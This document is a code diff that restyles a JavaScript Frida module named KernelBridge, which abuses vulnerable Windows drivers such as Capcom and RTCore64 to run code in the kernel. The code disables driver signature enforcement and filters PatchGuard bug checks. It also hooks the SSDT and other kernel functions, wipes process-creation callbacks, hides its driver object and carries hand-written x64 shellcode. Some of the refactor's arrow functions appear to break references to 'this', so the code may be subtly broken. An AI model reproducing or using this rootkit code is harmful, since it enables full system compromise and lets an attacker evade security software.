@@ -198,10 +198,10 @@ const KernelBridge = {
     },
 
     // Check privileges
-    checkPrivileges: function () {
+    checkPrivileges: () => {
         try {
-            var isAdmin = Module.findExportByName('shell32.dll', 'IsUserAnAdmin');
-            if (isAdmin) {
+          const isAdmin = Module.findExportByName('shell32.dll', 'IsUserAnAdmin');
+          if (isAdmin) {
                 return new NativeFunction(isAdmin, 'bool', [])();
             }
         } catch {}
@@ -211,31 +211,29 @@ const KernelBridge = {
 
     // Find vulnerable driver
     findVulnerableDriver: function () {
-        var self = this;
-
         send({
             type: 'status',
             target: 'kernel_bridge',
             action: 'searching_vulnerable_drivers',
         });
 
-        Object.keys(this.config.drivers).forEach(function (key) {
-            var driver = self.config.drivers[key];
-            if (!driver.enabled) return;
+        Object.keys(this.config.drivers).forEach(key => {
+          const driver = this.config.drivers[key];
+          if (!driver.enabled) { return; }
 
             // Try to open device
-            var handle = self.openDevice(driver.device);
-            if (handle && handle.toInt32() !== -1) {
+          const handle = this.openDevice(driver.device);
+          if (handle && handle.toInt32() !== -1) {
                 send({
                     type: 'success',
                     target: 'kernel_bridge',
                     action: 'vulnerable_driver_found',
                     driver_name: driver.name,
                 });
-                self.driverHandle = handle;
-                self.currentDriver = driver;
-                self.stats.driversLoaded++;
-                return;
+                this.driverHandle = handle;
+                this.currentDriver = driver;
+                this.stats.driversLoaded++;
+
             }
         });
 
@@ -246,16 +244,16 @@ const KernelBridge = {
     },
 
     // Open device
-    openDevice: function (deviceName) {
-        var createFile = new NativeFunction(
-            Module.findExportByName('kernel32.dll', 'CreateFileW'),
-            'pointer',
-            ['pointer', 'uint32', 'uint32', 'pointer', 'uint32', 'uint32', 'pointer']
-        );
+    openDevice: deviceName => {
+      const createFile = new NativeFunction(
+        Module.findExportByName('kernel32.dll', 'CreateFileW'),
+        'pointer',
+        ['pointer', 'uint32', 'uint32', 'pointer', 'uint32', 'uint32', 'pointer']
+      );
 
-        var devicePath = Memory.allocUtf16String(deviceName);
+      const devicePath = Memory.allocUtf16String(deviceName);
 
-        return createFile(
+      return createFile(
             devicePath,
             0xc0000000, // GENERIC_READ | GENERIC_WRITE
             0, // No sharing
@@ -268,8 +266,6 @@ const KernelBridge = {
 
     // Load vulnerable driver
     loadVulnerableDriver: function () {
-        var self = this;
-
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -277,15 +273,15 @@ const KernelBridge = {
         });
 
         // Drop driver to temp
-        var tempPath = this.getTempPath() + '\\driver.sys';
-        this.dropDriver(tempPath);
+      const tempPath = `${this.getTempPath()}\\driver.sys`;
+      this.dropDriver(tempPath);
 
         // Create service
-        var scManager = this.openSCManager();
-        if (!scManager) return;
+      const scManager = this.openSCManager();
+      if (!scManager) { return; }
 
-        var service = this.createDriverService(scManager, tempPath);
-        if (!service) {
+      const service = this.createDriverService(scManager, tempPath);
+      if (!service) {
             this.closeSCManager(scManager);
             return;
         }
@@ -299,8 +295,8 @@ const KernelBridge = {
             });
 
             // Try to open device again
-            setTimeout(function () {
-                self.findVulnerableDriver();
+            setTimeout(() => {
+                this.findVulnerableDriver();
             }, 1000);
         }
 
@@ -349,30 +345,30 @@ const KernelBridge = {
     },
 
     // Get kernel module base
-    getKernelModuleBase: function (moduleName) {
+    getKernelModuleBase: moduleName => {
         // Use NtQuerySystemInformation
-        var NtQuerySystemInformation = new NativeFunction(
-            Module.findExportByName('ntdll.dll', 'NtQuerySystemInformation'),
-            'uint32',
-            ['uint32', 'pointer', 'uint32', 'pointer']
-        );
+      const NtQuerySystemInformation = new NativeFunction(
+        Module.findExportByName('ntdll.dll', 'NtQuerySystemInformation'),
+        'uint32',
+        ['uint32', 'pointer', 'uint32', 'pointer']
+      );
 
-        // SystemModuleInformation = 11
-        var size = 0x10000;
-        var buffer = Memory.alloc(size);
-        var returnLength = Memory.alloc(4);
+      // SystemModuleInformation = 11
+      const size = 0x10000;
+      const buffer = Memory.alloc(size);
+      const returnLength = Memory.alloc(4);
 
-        var status = NtQuerySystemInformation(11, buffer, size, returnLength);
+      const status = NtQuerySystemInformation(11, buffer, size, returnLength);
 
-        if (status === 0) {
-            var count = buffer.readU32();
-            var modules = buffer.add(8);
+      if (status === 0) {
+          const count = buffer.readU32();
+          const modules = buffer.add(8);
 
-            for (var i = 0; i < count; i++) {
-                var entry = modules.add(i * 0x128); // sizeof(RTL_PROCESS_MODULE_INFORMATION)
-                var imageName = entry.add(0x8).readCString();
+          for (let i = 0; i < count; i++) {
+              const entry = modules.add(i * 0x128); // sizeof(RTL_PROCESS_MODULE_INFORMATION)
+              const imageName = entry.add(0x8).readCString();
 
-                if (imageName.toLowerCase().includes(moduleName.toLowerCase())) {
+              if (imageName.toLowerCase().includes(moduleName.toLowerCase())) {
                     return entry.add(0x18).readPointer();
                 }
             }
@@ -383,16 +379,16 @@ const KernelBridge = {
 
     // Find SSDT
     findSSDT: function () {
-        if (!this.ntoskrnlBase) return null;
+        if (!this.ntoskrnlBase) { return null; }
 
         // Search for KeServiceDescriptorTable pattern
-        var pattern = '4C 8D 15 ?? ?? ?? ?? 4C 8D 1D ?? ?? ?? ?? F7';
-        var result = this.searchKernelPattern(this.ntoskrnlBase, pattern);
+      const pattern = '4C 8D 15 ?? ?? ?? ?? 4C 8D 1D ?? ?? ?? ?? F7';
+      const result = this.searchKernelPattern(this.ntoskrnlBase, pattern);
 
-        if (result) {
+      if (result) {
             // Calculate SSDT address from RIP-relative addressing
-            var offset = result.add(3).readS32();
-            return result.add(7).add(offset);
+          const offset = result.add(3).readS32();
+          return result.add(7).add(offset);
         }
 
         return null;
@@ -431,51 +427,51 @@ const KernelBridge = {
     // Bypass PatchGuard via exception hook
     bypassPGViaExceptionHook: function () {
         // Hook KeBugCheckEx
-        var keBugCheckEx = this.getKernelExport('KeBugCheckEx');
-        if (!keBugCheckEx) return;
+      const keBugCheckEx = this.getKernelExport('KeBugCheckEx');
+      if (!keBugCheckEx) { return; }
 
         // Generate shellcode to filter PatchGuard bug checks
-        var shellcode = [
-            0x48,
-            0x83,
-            0xec,
-            0x28, // sub rsp, 28h
-            0x48,
-            0x81,
-            0xf9,
-            0x09,
-            0x01,
-            0x00,
-            0x00, // cmp rcx, 109h (CRITICAL_STRUCTURE_CORRUPTION)
-            0x74,
-            0x10, // je skip
-            0x48,
-            0x81,
-            0xf9,
-            0x0a,
-            0x01,
-            0x00,
-            0x00, // cmp rcx, 10Ah (KERNEL_MODE_EXCEPTION_NOT_HANDLED)
-            0x74,
-            0x07, // je skip
-            // Call original
-            0xe8,
-            0x00,
-            0x00,
-            0x00,
-            0x00, // call original
-            0xeb,
-            0x05, // jmp end
-            // skip:
-            0x48,
-            0x83,
-            0xc4,
-            0x28, // add rsp, 28h
-            0xc3, // ret
-            // end:
-        ];
+      const shellcode = [
+        0x48,
+        0x83,
+        0xec,
+        0x28, // sub rsp, 28h
+        0x48,
+        0x81,
+        0xf9,
+        0x09,
+        0x01,
+        0x00,
+        0x00, // cmp rcx, 109h (CRITICAL_STRUCTURE_CORRUPTION)
+        0x74,
+        0x10, // je skip
+        0x48,
+        0x81,
+        0xf9,
+        0x0a,
+        0x01,
+        0x00,
+        0x00, // cmp rcx, 10Ah (KERNEL_MODE_EXCEPTION_NOT_HANDLED)
+        0x74,
+        0x07, // je skip
+        // Call original
+        0xe8,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // call original
+        0xeb,
+        0x05, // jmp end
+        // skip:
+        0x48,
+        0x83,
+        0xc4,
+        0x28, // add rsp, 28h
+        0xc3, // ret
+        // end:
+      ];
 
-        this.installKernelHook(keBugCheckEx, shellcode);
+      this.installKernelHook(keBugCheckEx, shellcode);
         send({
             type: 'success',
             target: 'kernel_bridge',
@@ -486,19 +482,19 @@ const KernelBridge = {
     // Disable Driver Signature Enforcement
     disableDSE: function () {
         // Find g_CiOptions
-        var ciBase = this.getKernelModuleBase('ci.dll');
-        if (!ciBase) return;
+      const ciBase = this.getKernelModuleBase('ci.dll');
+      if (!ciBase) { return; }
 
         // Search for g_CiOptions pattern
-        var pattern = '89 ?? ?? ?? ?? ?? 40 84 FF 0F 84';
-        var result = this.searchKernelPattern(ciBase, pattern);
+      const pattern = '89 ?? ?? ?? ?? ?? 40 84 FF 0F 84';
+      const result = this.searchKernelPattern(ciBase, pattern);
 
-        if (result) {
-            var g_CiOptions = result.add(2).readPointer();
+      if (result) {
+          const g_CiOptions = result.add(2).readPointer();
 
-            // Clear DSE bits
-            var currentValue = this.readKernelMemory(g_CiOptions, 4).readU32();
-            var newValue = currentValue & ~0x6; // Clear bits 1 and 2
+          // Clear DSE bits
+          const currentValue = this.readKernelMemory(g_CiOptions, 4).readU32();
+          const newValue = currentValue & ~0x6; // Clear bits 1 and 2
 
             this.writeKernelMemory(g_CiOptions, newValue);
             send({
@@ -534,9 +530,7 @@ const KernelBridge = {
 
     // Install SSDT hooks
     installSSDTHooks: function () {
-        var self = this;
-
-        if (!this.ssdtAddress) return;
+        if (!this.ssdtAddress) { return; }
 
         send({
             type: 'status',
@@ -544,36 +538,36 @@ const KernelBridge = {
             action: 'installing_ssdt_hooks',
         });
 
-        Object.keys(this.config.hooks.ssdt).forEach(function (syscall) {
-            if (!self.config.hooks.ssdt[syscall]) return;
+        Object.keys(this.config.hooks.ssdt).forEach(syscall => {
+            if (!this.config.hooks.ssdt[syscall]) { return; }
 
-            var index = self.getSyscallIndex(syscall);
-            if (index === -1) return;
+          const index = this.getSyscallIndex(syscall);
+          if (index === -1) { return; }
 
             // Read current SSDT entry
-            var entry = self.readKernelMemory(self.ssdtAddress.add(index * 4), 4);
-            var offset = entry.readS32();
-            var originalFunc = self.ssdtAddress.add(offset >> 4);
+          const entry = this.readKernelMemory(this.ssdtAddress.add(index * 4), 4);
+          const offset = entry.readS32();
+          const originalFunc = this.ssdtAddress.add(offset >> 4);
 
-            // Generate hook shellcode
-            var hookShellcode = self.generateSSDTHook(syscall, originalFunc);
+          // Generate hook shellcode
+          const hookShellcode = this.generateSSDTHook(syscall, originalFunc);
 
-            // Allocate kernel memory for hook
-            var hookAddr = self.allocateKernelMemory(hookShellcode.length);
-            self.writeKernelMemory(hookAddr, hookShellcode);
+          // Allocate kernel memory for hook
+          const hookAddr = this.allocateKernelMemory(hookShellcode.length);
+          this.writeKernelMemory(hookAddr, hookShellcode);
 
             // Calculate new offset
-            var newOffset = (hookAddr.sub(self.ssdtAddress).toInt32() << 4) | (offset & 0xf);
+          const newOffset = (hookAddr.sub(this.ssdtAddress).toInt32() << 4) | (offset & 0xf);
 
-            // Update SSDT
-            self.writeKernelMemory(self.ssdtAddress.add(index * 4), newOffset);
+          // Update SSDT
+            this.writeKernelMemory(this.ssdtAddress.add(index * 4), newOffset);
 
-            self.hooks[syscall] = {
+            this.hooks[syscall] = {
                 original: originalFunc,
                 hook: hookAddr,
             };
 
-            self.stats.hooksInstalled++;
+            this.stats.hooksInstalled++;
             send({
                 type: 'success',
                 target: 'kernel_bridge',
@@ -584,112 +578,112 @@ const KernelBridge = {
     },
 
     // Get syscall index
-    getSyscallIndex: function (syscallName) {
+    getSyscallIndex: syscallName => {
         // Syscall indices for Windows 10/11
-        var indices = {
-            NtQuerySystemTime: 0x5a,
-            NtQueryPerformanceCounter: 0x49,
-            NtCreateFile: 0x55,
-            NtOpenProcess: 0x26,
-            NtReadVirtualMemory: 0x3f,
-            NtWriteVirtualMemory: 0x3a,
-        };
+      const indices = {
+        NtQuerySystemTime: 0x5a,
+        NtQueryPerformanceCounter: 0x49,
+        NtCreateFile: 0x55,
+        NtOpenProcess: 0x26,
+        NtReadVirtualMemory: 0x3f,
+        NtWriteVirtualMemory: 0x3a,
+      };
 
-        return indices[syscallName] || -1;
+      return indices[syscallName] || -1;
     },
 
     // Generate SSDT hook shellcode
     generateSSDTHook: function (syscall, original) {
         // Generic hook template
-        var hook = [
-            // Save registers
-            0x48,
-            0x89,
-            0x4c,
-            0x24,
-            0x08, // mov [rsp+8], rcx
-            0x48,
-            0x89,
-            0x54,
-            0x24,
-            0x10, // mov [rsp+10h], rdx
-            0x4c,
-            0x89,
-            0x44,
-            0x24,
-            0x18, // mov [rsp+18h], r8
-            0x4c,
-            0x89,
-            0x4c,
-            0x24,
-            0x20, // mov [rsp+20h], r9
+      const hook = [
+        // Save registers
+        0x48,
+        0x89,
+        0x4c,
+        0x24,
+        0x08, // mov [rsp+8], rcx
+        0x48,
+        0x89,
+        0x54,
+        0x24,
+        0x10, // mov [rsp+10h], rdx
+        0x4c,
+        0x89,
+        0x44,
+        0x24,
+        0x18, // mov [rsp+18h], r8
+        0x4c,
+        0x89,
+        0x4c,
+        0x24,
+        0x20, // mov [rsp+20h], r9
 
-            // Call our handler
-            0x48,
-            0xb8,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00, // mov rax, handler
-            0xff,
-            0xd0, // call rax
+        // Call our handler
+        0x48,
+        0xb8,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // mov rax, handler
+        0xff,
+        0xd0, // call rax
 
-            // Check if we should block
-            0x48,
-            0x85,
-            0xc0, // test rax, rax
-            0x75,
-            0x1c, // jnz block
+        // Check if we should block
+        0x48,
+        0x85,
+        0xc0, // test rax, rax
+        0x75,
+        0x1c, // jnz block
 
-            // Restore registers and call original
-            0x48,
-            0x8b,
-            0x4c,
-            0x24,
-            0x08, // mov rcx, [rsp+8]
-            0x48,
-            0x8b,
-            0x54,
-            0x24,
-            0x10, // mov rdx, [rsp+10h]
-            0x4c,
-            0x8b,
-            0x44,
-            0x24,
-            0x18, // mov r8, [rsp+18h]
-            0x4c,
-            0x8b,
-            0x4c,
-            0x24,
-            0x20, // mov r9, [rsp+20h]
+        // Restore registers and call original
+        0x48,
+        0x8b,
+        0x4c,
+        0x24,
+        0x08, // mov rcx, [rsp+8]
+        0x48,
+        0x8b,
+        0x54,
+        0x24,
+        0x10, // mov rdx, [rsp+10h]
+        0x4c,
+        0x8b,
+        0x44,
+        0x24,
+        0x18, // mov r8, [rsp+18h]
+        0x4c,
+        0x8b,
+        0x4c,
+        0x24,
+        0x20, // mov r9, [rsp+20h]
 
-            0x48,
-            0xb8,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00, // mov rax, original
-            0xff,
-            0xe0, // jmp rax
+        0x48,
+        0xb8,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // mov rax, original
+        0xff,
+        0xe0, // jmp rax
 
-            // block:
-            0x48,
-            0x31,
-            0xc0, // xor rax, rax (STATUS_SUCCESS)
-            0xc3, // ret
-        ];
+        // block:
+        0x48,
+        0x31,
+        0xc0, // xor rax, rax (STATUS_SUCCESS)
+        0xc3, // ret
+      ];
 
-        // Patch addresses
-        var handlerAddr = this.getHandlerAddress(syscall);
-        for (var i = 0; i < 8; i++) {
+      // Patch addresses
+      const handlerAddr = this.getHandlerAddress(syscall);
+      for (var i = 0; i < 8; i++) {
             hook[16 + i] = (handlerAddr >> (i * 8)) & 0xff;
         }
 
@@ -732,13 +726,13 @@ const KernelBridge = {
     // Remove process callbacks
     removeProcessCallbacks: function () {
         // Find PspCreateProcessNotifyRoutine array
-        var pspRoutines = this.findPspCreateProcessNotifyRoutine();
-        if (!pspRoutines) return;
+      const pspRoutines = this.findPspCreateProcessNotifyRoutine();
+      if (!pspRoutines) { return; }
 
         // Clear all callbacks
-        for (var i = 0; i < 64; i++) {
-            var entry = this.readKernelMemory(pspRoutines.add(i * 8), 8);
-            if (entry.toInt32() !== 0) {
+        for (let i = 0; i < 64; i++) {
+          const entry = this.readKernelMemory(pspRoutines.add(i * 8), 8);
+          if (entry.toInt32() !== 0) {
                 this.writeKernelMemory(pspRoutines.add(i * 8), ptr(0));
                 this.stats.callbacksBypassed++;
             }
@@ -753,8 +747,6 @@ const KernelBridge = {
 
     // Install inline hooks
     installInlineHooks: function () {
-        var self = this;
-
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -762,18 +754,18 @@ const KernelBridge = {
         });
 
         // Hook critical functions
-        var targets = [
-            { module: 'ntoskrnl.exe', function: 'ObRegisterCallbacks' },
-            { module: 'ntoskrnl.exe', function: 'ObUnRegisterCallbacks' },
-            { module: 'ntoskrnl.exe', function: 'CmRegisterCallbackEx' },
-            { module: 'ntoskrnl.exe', function: 'ExAllocatePoolWithTag' },
-            { module: 'ntoskrnl.exe', function: 'MmGetSystemRoutineAddress' },
-        ];
+      const targets = [
+        {module: 'ntoskrnl.exe', function: 'ObRegisterCallbacks'},
+        {module: 'ntoskrnl.exe', function: 'ObUnRegisterCallbacks'},
+        {module: 'ntoskrnl.exe', function: 'CmRegisterCallbackEx'},
+        {module: 'ntoskrnl.exe', function: 'ExAllocatePoolWithTag'},
+        {module: 'ntoskrnl.exe', function: 'MmGetSystemRoutineAddress'},
+      ];
 
-        targets.forEach(function (target) {
-            var funcAddr = self.getKernelExport(target.function);
-            if (funcAddr) {
-                self.installInlineHook(funcAddr, target.function);
+      targets.forEach(target => {
+          const funcAddr = this.getKernelExport(target.function);
+          if (funcAddr) {
+                this.installInlineHook(funcAddr, target.function);
             }
         });
     },
@@ -781,34 +773,34 @@ const KernelBridge = {
     // Install inline hook
     installInlineHook: function (target, name) {
         // Generate trampoline
-        var trampoline = [
-            0x48,
-            0xb8,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00, // mov rax, hook
-            0xff,
-            0xe0, // jmp rax
-        ];
+      const trampoline = [
+        0x48,
+        0xb8,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // mov rax, hook
+        0xff,
+        0xe0, // jmp rax
+      ];
 
-        // Allocate hook function
-        var hookFunc = this.allocateKernelMemory(0x1000);
-        var hookCode = this.generateInlineHookCode(target, name);
-        this.writeKernelMemory(hookFunc, hookCode);
+      // Allocate hook function
+      const hookFunc = this.allocateKernelMemory(0x1000);
+      const hookCode = this.generateInlineHookCode(target, name);
+      this.writeKernelMemory(hookFunc, hookCode);
 
         // Patch trampoline
-        for (var i = 0; i < 8; i++) {
+        for (let i = 0; i < 8; i++) {
             trampoline[2 + i] = (hookFunc >> (i * 8)) & 0xff;
         }
 
         // Save original bytes
-        var originalBytes = this.readKernelMemory(target, 12);
-        this.hooks[name] = {
+      const originalBytes = this.readKernelMemory(target, 12);
+      this.hooks[name] = {
             target: target,
             original: originalBytes,
             hook: hookFunc,
@@ -858,15 +850,15 @@ const KernelBridge = {
     // Hide driver object
     hideDriverObject: function () {
         // Find our driver object
-        var driverObject = this.findDriverObject();
-        if (!driverObject) return;
+      const driverObject = this.findDriverObject();
+      if (!driverObject) { return; }
 
         // Unlink from driver list
-        var listEntry = driverObject.add(0x48); // DriverSection
-        var flink = this.readKernelMemory(listEntry, 8);
-        var blink = this.readKernelMemory(listEntry.add(8), 8);
+      const listEntry = driverObject.add(0x48); // DriverSection
+      const flink = this.readKernelMemory(listEntry, 8);
+      const blink = this.readKernelMemory(listEntry.add(8), 8);
 
-        // Unlink
+      // Unlink
         this.writeKernelMemory(blink.add(0), flink);
         this.writeKernelMemory(flink.add(8), blink);
 
@@ -883,46 +875,44 @@ const KernelBridge = {
 
     // Implement hook stealth
     implementHookStealth: function () {
-        var self = this;
-
         // Hook memory read functions to hide our modifications
-        var targets = ['MmCopyVirtualMemory', 'MmCopyMemory', 'RtlCopyMemory'];
+      const targets = ['MmCopyVirtualMemory', 'MmCopyMemory', 'RtlCopyMemory'];
 
-        targets.forEach(function (func) {
-            var addr = self.getKernelExport(func);
-            if (addr) {
-                self.installStealthHook(addr, func);
+      targets.forEach(func => {
+          const addr = this.getKernelExport(func);
+          if (addr) {
+                this.installStealthHook(addr, func);
             }
         });
     },
 
     // Execute in kernel
     executeInKernel: function (shellcode) {
-        if (!this.driverHandle || !this.currentDriver) return null;
+        if (!this.driverHandle || !this.currentDriver) { return null; }
 
-        var deviceIoControl = new NativeFunction(
-            Module.findExportByName('kernel32.dll', 'DeviceIoControl'),
-            'bool',
-            ['pointer', 'uint32', 'pointer', 'uint32', 'pointer', 'uint32', 'pointer', 'pointer']
-        );
+      const deviceIoControl = new NativeFunction(
+        Module.findExportByName('kernel32.dll', 'DeviceIoControl'),
+        'bool',
+        ['pointer', 'uint32', 'pointer', 'uint32', 'pointer', 'uint32', 'pointer', 'pointer']
+      );
 
-        // Prepare input buffer based on driver type
-        var inputBuffer = this.prepareKernelPayload(shellcode);
-        var outputBuffer = Memory.alloc(0x1000);
-        var bytesReturned = Memory.alloc(4);
+      // Prepare input buffer based on driver type
+      const inputBuffer = this.prepareKernelPayload(shellcode);
+      const outputBuffer = Memory.alloc(0x1000);
+      const bytesReturned = Memory.alloc(4);
 
-        var result = deviceIoControl(
-            this.driverHandle,
-            this.currentDriver.ioctl,
-            inputBuffer,
-            inputBuffer.length,
-            outputBuffer,
-            0x1000,
-            bytesReturned,
-            ptr(0)
-        );
+      const result = deviceIoControl(
+        this.driverHandle,
+        this.currentDriver.ioctl,
+        inputBuffer,
+        inputBuffer.length,
+        outputBuffer,
+        0x1000,
+        bytesReturned,
+        ptr(0)
+      );
 
-        if (result) {
+      if (result) {
             return outputBuffer.readPointer();
         }
 
@@ -948,13 +938,13 @@ const KernelBridge = {
     },
 
     // Prepare Capcom payload
-    prepareCapcomPayload: function (shellcode) {
+    prepareCapcomPayload: shellcode => {
         // Capcom expects:
         // +0x00: Pointer to function
         // +0x08: Argument
 
-        var payload = Memory.alloc(0x10);
-        payload.writePointer(shellcode);
+      const payload = Memory.alloc(0x10);
+      payload.writePointer(shellcode);
         payload.add(8).writePointer(ptr(0));
 
         return payload;
@@ -965,25 +955,25 @@ const KernelBridge = {
         // Parameters used in shellcode generation
         void address;
         void size;
-        var shellcode = [
-            0x48,
-            0x89,
-            0xc8, // mov rax, rcx (address)
-            0x48,
-            0x89,
-            0xd1, // mov rcx, rdx (size)
-            0x48,
-            0x8b,
-            0x00, // mov rax, [rax]
-            0xc3, // ret
-        ];
+      const shellcode = [
+        0x48,
+        0x89,
+        0xc8, // mov rax, rcx (address)
+        0x48,
+        0x89,
+        0xd1, // mov rcx, rdx (size)
+        0x48,
+        0x8b,
+        0x00, // mov rax, [rax]
+        0xc3, // ret
+      ];
 
-        // Allocate and execute
-        var code = Memory.alloc(shellcode.length);
-        code.writeByteArray(shellcode);
+      // Allocate and execute
+      const code = Memory.alloc(shellcode.length);
+      code.writeByteArray(shellcode);
 
-        var result = this.executeInKernel(code);
-        return result;
+      const result = this.executeInKernel(code);
+      return result;
     },
 
     // Write kernel memory
@@ -991,79 +981,79 @@ const KernelBridge = {
         // Parameters used in shellcode generation
         void address;
         void data;
-        var shellcode = [
-            0x48,
-            0x89,
-            0xc8, // mov rax, rcx (address)
-            0x48,
-            0x89,
-            0xd1, // mov rcx, rdx (data)
-            0x48,
-            0x89,
-            0x08, // mov [rax], rcx
-            0xc3, // ret
-        ];
+      const shellcode = [
+        0x48,
+        0x89,
+        0xc8, // mov rax, rcx (address)
+        0x48,
+        0x89,
+        0xd1, // mov rcx, rdx (data)
+        0x48,
+        0x89,
+        0x08, // mov [rax], rcx
+        0xc3, // ret
+      ];
 
-        // Allocate and execute
-        var code = Memory.alloc(shellcode.length);
-        code.writeByteArray(shellcode);
+      // Allocate and execute
+      const code = Memory.alloc(shellcode.length);
+      code.writeByteArray(shellcode);
 
         this.executeInKernel(code);
     },
 
     // Allocate kernel memory
     allocateKernelMemory: function (size) {
-        var exAllocatePool = this.getKernelExport('ExAllocatePoolWithTag');
-        if (!exAllocatePool) return null;
+      const exAllocatePool = this.getKernelExport('ExAllocatePoolWithTag');
+      if (!exAllocatePool) { return null; }
 
-        var shellcode = [
-            0x48,
-            0x83,
-            0xec,
-            0x28, // sub rsp, 28h
-            0x48,
-            0xc7,
-            0xc1,
-            0x00,
-            0x00,
-            0x00,
-            0x00, // mov rcx, 0 (NonPagedPool)
-            0x48,
-            0xba,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00, // mov rdx, size
-            0x41,
-            0xb8,
-            0x6b,
-            0x72,
-            0x6e,
-            0x6c, // mov r8d, 'lnrk'
-            0x48,
-            0xb8,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00, // mov rax, ExAllocatePoolWithTag
-            0xff,
-            0xd0, // call rax
-            0x48,
-            0x83,
-            0xc4,
-            0x28, // add rsp, 28h
-            0xc3, // ret
-        ];
+      const shellcode = [
+        0x48,
+        0x83,
+        0xec,
+        0x28, // sub rsp, 28h
+        0x48,
+        0xc7,
+        0xc1,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // mov rcx, 0 (NonPagedPool)
+        0x48,
+        0xba,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // mov rdx, size
+        0x41,
+        0xb8,
+        0x6b,
+        0x72,
+        0x6e,
+        0x6c, // mov r8d, 'lnrk'
+        0x48,
+        0xb8,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // mov rax, ExAllocatePoolWithTag
+        0xff,
+        0xd0, // call rax
+        0x48,
+        0x83,
+        0xc4,
+        0x28, // add rsp, 28h
+        0xc3, // ret
+      ];
 
-        // Patch size
+      // Patch size
         for (var i = 0; i < 8; i++) {
             shellcode[11 + i] = (size >> (i * 8)) & 0xff;
         }
@@ -1073,70 +1063,70 @@ const KernelBridge = {
             shellcode[25 + i] = (exAllocatePool >> (i * 8)) & 0xff;
         }
 
-        var code = Memory.alloc(shellcode.length);
-        code.writeByteArray(shellcode);
+      const code = Memory.alloc(shellcode.length);
+      code.writeByteArray(shellcode);
 
         return this.executeInKernel(code);
     },
 
     // Get kernel export
     getKernelExport: function (functionName) {
-        if (!this.ntoskrnlBase) return null;
+        if (!this.ntoskrnlBase) { return null; }
 
         // Use MmGetSystemRoutineAddress
-        var mmGetSystemRoutineAddress = this.findMmGetSystemRoutineAddress();
-        if (!mmGetSystemRoutineAddress) return null;
+      const mmGetSystemRoutineAddress = this.findMmGetSystemRoutineAddress();
+      if (!mmGetSystemRoutineAddress) { return null; }
 
         // Create UNICODE_STRING
-        var unicodeString = Memory.alloc(16);
-        var nameBuffer = Memory.allocUtf16String(functionName);
+      const unicodeString = Memory.alloc(16);
+      const nameBuffer = Memory.allocUtf16String(functionName);
 
-        unicodeString.writeU16(functionName.length * 2);
+      unicodeString.writeU16(functionName.length * 2);
         unicodeString.add(2).writeU16(functionName.length * 2);
         unicodeString.add(8).writePointer(nameBuffer);
 
-        var shellcode = [
-            0x48,
-            0x83,
-            0xec,
-            0x28, // sub rsp, 28h
-            0x48,
-            0xb9,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00, // mov rcx, unicodeString
-            0x48,
-            0xb8,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00,
-            0x00, // mov rax, MmGetSystemRoutineAddress
-            0xff,
-            0xd0, // call rax
-            0x48,
-            0x83,
-            0xc4,
-            0x28, // add rsp, 28h
-            0xc3, // ret
-        ];
+      const shellcode = [
+        0x48,
+        0x83,
+        0xec,
+        0x28, // sub rsp, 28h
+        0x48,
+        0xb9,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // mov rcx, unicodeString
+        0x48,
+        0xb8,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00, // mov rax, MmGetSystemRoutineAddress
+        0xff,
+        0xd0, // call rax
+        0x48,
+        0x83,
+        0xc4,
+        0x28, // add rsp, 28h
+        0xc3, // ret
+      ];
 
-        // Patch addresses
-        for (var i = 0; i < 8; i++) {
+      // Patch addresses
+        for (let i = 0; i < 8; i++) {
             shellcode[6 + i] = (unicodeString >> (i * 8)) & 0xff;
             shellcode[16 + i] = (mmGetSystemRoutineAddress >> (i * 8)) & 0xff;
         }
 
-        var code = Memory.alloc(shellcode.length);
-        code.writeByteArray(shellcode);
+      const code = Memory.alloc(shellcode.length);
+      code.writeByteArray(shellcode);
 
         return this.executeInKernel(code);
     },
@@ -1156,7 +1146,6 @@ const KernelBridge = {
 
     // 1. Advanced kernel exploitation with multiple attack vectors
     initializeAdvancedKernelExploitation: function () {
-        var self = this;
         send({
             type: 'status',
             target: 'kernel_bridge',
@@ -1175,43 +1164,43 @@ const KernelBridge = {
             };
 
             // Modern vulnerable driver signatures (2024-2025)
-            var modernVulnDrivers = [
-                {
-                    name: 'RTCore64.sys',
-                    device: '\\\\.\\RTCore64',
-                    ioctl: 0x80002048,
-                    method: 'msi_afterburner',
-                },
-                {
-                    name: 'WinRing0x64.sys',
-                    device: '\\\\.\\WinRing0_1_2_0',
-                    ioctl: 0x80002010,
-                    method: 'physical_memory',
-                },
-                {
-                    name: 'AsIO3.sys',
-                    device: '\\\\.\\AsIO3',
-                    ioctl: 0x80002044,
-                    method: 'asus_io',
-                },
-                {
-                    name: 'GPU-Z.sys',
-                    device: '\\\\.\\GPUZDevice',
-                    ioctl: 0x80002050,
-                    method: 'gpu_direct',
-                },
-                {
-                    name: 'HWiNFO64A.sys',
-                    device: '\\\\.\\HWiNFO64',
-                    ioctl: 0x80002030,
-                    method: 'hwinfo_direct',
-                },
-            ];
+          const modernVulnDrivers = [
+            {
+              name: 'RTCore64.sys',
+              device: '\\\\.\\RTCore64',
